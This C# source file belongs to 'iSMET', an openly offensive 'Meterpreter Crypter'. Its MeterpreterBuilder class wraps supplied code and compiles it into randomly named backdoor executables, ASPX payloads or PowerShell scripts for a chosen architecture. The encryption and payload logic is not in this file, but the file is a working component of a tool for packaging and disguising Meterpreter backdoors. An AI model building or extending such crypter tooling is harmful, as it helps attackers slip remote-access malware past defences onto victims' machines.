using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using iSMET.CSharp.Collection;
using System.Windows.Forms;

namespace iSMET.CSharp.Collection
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
    public class MeterpreterBuilder
    {
        public string FileName = string.Empty;
        /// <summary>
        /// iSMET C# Console Application & Console Application with Mapped File Builder
        /// </summary>
        /// <param name="strCSharpCode">Random File Name</param>
        /// <param name="arch">Backdoor Architecture</param>
        public void ConsoleApplication(string strCSharpCode, string arch)
        {
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
            compiler.Console(text, ".exe", strCSharpCode, arch);
            ReturnMessageBox(text + ".exe", compiler.isCreated);
        }
        /// <summary>
        /// iSMET C# Form Application & Form Application with Mapped File Builder
        /// </summary>
        /// <param name="strCSharpCode">Random File Name</param>
        /// <param name="arch">Backdoor Architecture</param>
        public void FormApplication(string strCSharpCode, string arch)
        {
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
            compiler.Form(text, ".exe", strCSharpCode, arch);
            ReturnMessageBox(text + ".exe", compiler.isCreated);
        }
        /// <summary>
        /// iSMET C# ASPX- Application with Mapped File Builder
        /// </summary>
        /// <param name="strCSharpCode">Random File Name</param>
        /// <param name="arch">Backdoor Architecture</param>
        /// <param name="SelectedEncryption">Selected Encryption</param>
        public void AspxApplication(string strCSharpCode, string arch, int SelectedEncryption)
        {
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
            compiler.Aspx(text, ".bin", strCSharpCode, arch, SelectedEncryption);
            ReturnMessageBox(text + ".exe", compiler.isCreated);
        }
        public void PowerShell(string strCSharpCode)
        {
            var text = GeneralFunction.RandomFileName(0, 5);
            var compiler = new Compiler();
            compiler.PowerShell(text, ".ps1", strCSharpCode);
            ReturnMessageBox(text + ".ps1", compiler.isCreated);
        }
        /// <summary>
        /// iSMET Return MessageBox
        /// </summary>
        /// <param name="fileName">Random File Name</param>
        /// <param name="isCreated">File Create Control</param>
        private void ReturnMessageBox(string fileName, bool isCreated)
        {
            if (isCreated)
            {
                FileName = fileName;
                MessageBox.Show($"File Created!{Environment.NewLine}{fileName}", $"iSMET - Meterpreter Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                System.Console.WriteLine($"File Created!{Environment.NewLine}{fileName}", $"iSMET - Meterpreter Crypter");
            }
            else
            {
                MessageBox.Show("File can not be created", @"iSMET - Meterpreter Crypter", MessageBoxButtons.OK, MessageBoxIcon.Error);
                System.Console.WriteLine("File can not be created", @"iSMET - Meterpreter Crypter");
            }
        }
	}
}
